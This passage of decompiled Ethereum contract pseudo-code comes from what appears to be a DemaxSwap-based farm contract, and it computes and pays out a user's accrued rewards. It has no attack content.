                if ext_call.return_data[18 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[905 len 24]
                if ext_call.return_data[50 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[905 len 24]
                if not sub_8bb0097b[msg.sender][arg1].field_1536:
                    require ext_call.return_data[18 len 14]
                    if 0 / ext_call.return_data[18 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[899 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, 0 / Mask(112, 0, ext_call.return_data[0])
                else:
                    if ext_call.return_data[50 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / sub_8bb0097b[msg.sender][arg1].field_1536 != ext_call.return_data[50 len 14]:
                        revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[898 len 31]
                    require ext_call.return_data[18 len 14]
                    if ext_call.return_data[50 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / ext_call.return_data[18 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[899 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, Mask(112, 0, ext_call.return_data[32]) * sub_8bb0097b[msg.sender][arg1].field_1536 / Mask(112, 0, ext_call.return_data[0])
            else:
                if ext_call.return_data[50 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[905 len 24]
                if ext_call.return_data[18 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[905 len 24]
                if not sub_8bb0097b[msg.sender][arg1].field_1536:
                    require ext_call.return_data[50 len 14]
                    if 0 / ext_call.return_data[50 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[899 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, 0 / Mask(112, 0, ext_call.return_data[32])
                else:
                    if ext_call.return_data[18 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / sub_8bb0097b[msg.sender][arg1].field_1536 != ext_call.return_data[18 len 14]:
                        revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[898 len 31]
                    require ext_call.return_data[50 len 14]
                    if ext_call.return_data[18 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / ext_call.return_data[50 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[899 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, Mask(112, 0, ext_call.return_data[0]) * sub_8bb0097b[msg.sender][arg1].field_1536 / Mask(112, 0, ext_call.return_data[32])
    else:
        if sub_8bb0097b[address(msg.sender)][arg1].field_1280 > block.timestamp:
            revert with 0, 'SafeMath: subtraction overflow'
        if not block.timestamp - sub_8bb0097b[address(msg.sender)][arg1].field_1280:
            if sub_8bb0097b[address(msg.sender)][arg1].field_768:
                if 0 / sub_8bb0097b[address(msg.sender)][arg1].field_768:
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[773 len 31]
            sub_8bb0097b[address(msg.sender)][arg1].field_1536 = 0
        else:
            if (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024) / block.timestamp - sub_8bb0097b[address(msg.sender)][arg1].field_1280 != sub_8bb0097b[address(msg.sender)][arg1].field_1024:
                revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[773 len 31]
            if not sub_8bb0097b[address(msg.sender)][arg1].field_768:
                sub_8bb0097b[address(msg.sender)][arg1].field_1536 = 0
            else:
                if (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) / sub_8bb0097b[address(msg.sender)][arg1].field_768 != (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024):
                    revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[773 len 31]
                sub_8bb0097b[address(msg.sender)][arg1].field_1536 = (block.timestamp * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768) - (sub_8bb0097b[address(msg.sender)][arg1].field_1280 * sub_8bb0097b[address(msg.sender)][arg1].field_1024 * sub_8bb0097b[address(msg.sender)][arg1].field_768)
        sub_8bb0097b[address(msg.sender)][arg1].field_1280 = block.timestamp
        if sub_8bb0097b[address(msg.sender)][arg1].field_1024 != packages[arg1].field_768:
            if block.timestamp > packages[arg1].field_1024:
                sub_8bb0097b[address(msg.sender)][arg1].field_1024 = packages[arg1].field_768
        if sub_19685067Address == sub_ea6cfd4aAddress:
            revert with 0, 32, 37, 0x5344656d6178537761704c6962726172793a204944454e544943414c5f4144445245535345, mem[777 len 27]
        if sub_19685067Address < sub_ea6cfd4aAddress:
            if not sub_19685067Address:
                revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
            if sub_19685067Address == sub_ea6cfd4aAddress:
                revert with 0, 32, 37, 0x5344656d6178537761704c6962726172793a204944454e544943414c5f4144445245535345, mem[777 len 27]
            if sub_19685067Address < sub_ea6cfd4aAddress:
                if not sub_19685067Address:
                    revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
                require ext_code.size(FACTORYAddress)
                staticcall FACTORYAddress.contractCodeHash() with:
                        gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(address(sha3(0, FACTORYAddress, sha3(sub_19685067Address, sub_ea6cfd4aAddress), ext_call.return_data[0])))
                staticcall address(sha3(0, FACTORYAddress, sha3(sub_19685067Address, sub_ea6cfd4aAddress), ext_call.return_data[0])).getReserves() with:
                        gas gas_remaining wei
            else:
                if not sub_ea6cfd4aAddress:
                    revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
                require ext_code.size(FACTORYAddress)
                staticcall FACTORYAddress.contractCodeHash() with:
                        gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(address(sha3(0, FACTORYAddress, sha3(sub_ea6cfd4aAddress, sub_19685067Address), ext_call.return_data[0])))
                staticcall address(sha3(0, FACTORYAddress, sha3(sub_ea6cfd4aAddress, sub_19685067Address), ext_call.return_data[0])).getReserves() with:
                        gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 96
            if sub_8bb0097b[msg.sender][arg1].field_1536 <= 0:
                revert with 0, 32, 37, 0x5744656d6178537761704c6962726172793a20494e53554646494349454e545f414d4f554e, mem[966 len 27]
            if sub_19685067Address == sub_19685067Address:
                if ext_call.return_data[18 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[969 len 24]
                if ext_call.return_data[50 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[969 len 24]
                if not sub_8bb0097b[msg.sender][arg1].field_1536:
                    require ext_call.return_data[18 len 14]
                    if 0 / ext_call.return_data[18 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[963 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, 0 / Mask(112, 0, ext_call.return_data[0])
                else:
                    if ext_call.return_data[50 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / sub_8bb0097b[msg.sender][arg1].field_1536 != ext_call.return_data[50 len 14]:
                        revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[962 len 31]
                    require ext_call.return_data[18 len 14]
                    if ext_call.return_data[50 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / ext_call.return_data[18 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[963 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, Mask(112, 0, ext_call.return_data[32]) * sub_8bb0097b[msg.sender][arg1].field_1536 / Mask(112, 0, ext_call.return_data[0])
            else:
                if ext_call.return_data[50 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[969 len 24]
                if ext_call.return_data[18 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[969 len 24]
                if not sub_8bb0097b[msg.sender][arg1].field_1536:
                    require ext_call.return_data[50 len 14]
                    if 0 / ext_call.return_data[50 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[963 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, 0 / Mask(112, 0, ext_call.return_data[32])
                else:
                    if ext_call.return_data[18 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / sub_8bb0097b[msg.sender][arg1].field_1536 != ext_call.return_data[18 len 14]:
                        revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[962 len 31]
                    require ext_call.return_data[50 len 14]
                    if ext_call.return_data[18 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / ext_call.return_data[50 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[963 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, Mask(112, 0, ext_call.return_data[0]) * sub_8bb0097b[msg.sender][arg1].field_1536 / Mask(112, 0, ext_call.return_data[32])
        else:
            if not sub_ea6cfd4aAddress:
                revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
            if sub_19685067Address == sub_ea6cfd4aAddress:
                revert with 0, 32, 37, 0x5344656d6178537761704c6962726172793a204944454e544943414c5f4144445245535345, mem[777 len 27]
            if sub_19685067Address < sub_ea6cfd4aAddress:
                if not sub_19685067Address:
                    revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
                require ext_code.size(FACTORYAddress)
                staticcall FACTORYAddress.contractCodeHash() with:
                        gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(address(sha3(0, FACTORYAddress, sha3(sub_19685067Address, sub_ea6cfd4aAddress), ext_call.return_data[0])))
                staticcall address(sha3(0, FACTORYAddress, sha3(sub_19685067Address, sub_ea6cfd4aAddress), ext_call.return_data[0])).getReserves() with:
                        gas gas_remaining wei
            else:
                if not sub_ea6cfd4aAddress:
                    revert with 0, 'DemaxSwapLibrary: ZERO_ADDRESS'
                require ext_code.size(FACTORYAddress)
                staticcall FACTORYAddress.contractCodeHash() with:
                        gas gas_remaining wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_code.size(address(sha3(0, FACTORYAddress, sha3(sub_ea6cfd4aAddress, sub_19685067Address), ext_call.return_data[0])))
                staticcall address(sha3(0, FACTORYAddress, sha3(sub_ea6cfd4aAddress, sub_19685067Address), ext_call.return_data[0])).getReserves() with:
                        gas gas_remaining wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 96
            if sub_8bb0097b[msg.sender][arg1].field_1536 <= 0:
                revert with 0, 32, 37, 0x5744656d6178537761704c6962726172793a20494e53554646494349454e545f414d4f554e, mem[966 len 27]
            if sub_ea6cfd4aAddress == sub_19685067Address:
                if ext_call.return_data[18 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[969 len 24]
                if ext_call.return_data[50 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[969 len 24]
                if not sub_8bb0097b[msg.sender][arg1].field_1536:
                    require ext_call.return_data[18 len 14]
                    if 0 / ext_call.return_data[18 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[963 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, 0 / Mask(112, 0, ext_call.return_data[0])
                else:
                    if ext_call.return_data[50 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / sub_8bb0097b[msg.sender][arg1].field_1536 != ext_call.return_data[50 len 14]:
                        revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[962 len 31]
                    require ext_call.return_data[18 len 14]
                    if ext_call.return_data[50 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / ext_call.return_data[18 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[963 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, Mask(112, 0, ext_call.return_data[32]) * sub_8bb0097b[msg.sender][arg1].field_1536 / Mask(112, 0, ext_call.return_data[0])
            else:
                if ext_call.return_data[50 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[969 len 24]
                if ext_call.return_data[18 len 14] <= 0:
                    revert with 0, 32, 40, 0x5344656d6178537761704c6962726172793a20494e53554646494349454e545f4c49515549444954, mem[969 len 24]
                if not sub_8bb0097b[msg.sender][arg1].field_1536:
                    require ext_call.return_data[50 len 14]
                    if 0 / ext_call.return_data[50 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[963 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, 0 / Mask(112, 0, ext_call.return_data[32])
                else:
                    if ext_call.return_data[18 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / sub_8bb0097b[msg.sender][arg1].field_1536 != ext_call.return_data[18 len 14]:
                        revert with 0, 32, 33, 0x48536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[962 len 31]
                    require ext_call.return_data[50 len 14]
                    if ext_call.return_data[18 len 14] * sub_8bb0097b[msg.sender][arg1].field_1536 / ext_call.return_data[50 len 14] <= 0:
                        revert with 0, 32, 34, 0x4443524f535346494e204641524d3a204e4f5448494e4720544f2057495448445241, mem[963 len 30]
                    require ext_code.size(sub_ea6cfd4aAddress)
                    call sub_ea6cfd4aAddress.transfer(address rg1, uint256 rg2) with:
                         gas gas_remaining wei
                        args msg.sender, Mask(112, 0, ext_call.return_data[0]) * sub_8bb0097b[msg.sender][arg1].field_1536 / Mask(112, 0, ext_call.return_data[32])
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    sub_8bb0097b[msg.sender][arg1].field_1792 += sub_8bb0097b[msg.sender][arg1].field_1536
    sub_8bb0097b[msg.sender][arg1].field_1536 = 0
    emit UpdateUser(msg.sender, arg1);
}



}
